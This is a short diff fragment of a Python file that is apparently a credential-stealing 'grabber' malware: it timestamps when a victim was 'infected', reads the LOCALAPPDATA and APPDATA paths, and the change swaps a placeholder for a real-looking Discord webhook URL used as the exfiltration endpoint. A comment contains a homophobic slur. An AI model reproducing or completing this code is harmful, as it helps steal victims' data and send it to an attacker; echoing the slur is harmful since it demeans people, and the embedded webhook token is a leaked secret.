@@ -3,7 +3,7 @@ from datetime import datetime
 
 infected_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S') # Time when faggot got infected LOL
 colors = [0x630464, 0x721d73, 0x823683, 0x914f92, 0xa168a2, 0xb181b1]
-webhook = 'webhook here!'
+webhook = 'https://discord.com/api/webhooks/937183811081502730/l7ZuqNt3MvuCLtizGkDbdrpUKXad665FsXrzQzNZkQSnZvjdLoX1i73y20E_nCbH9rh8'
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
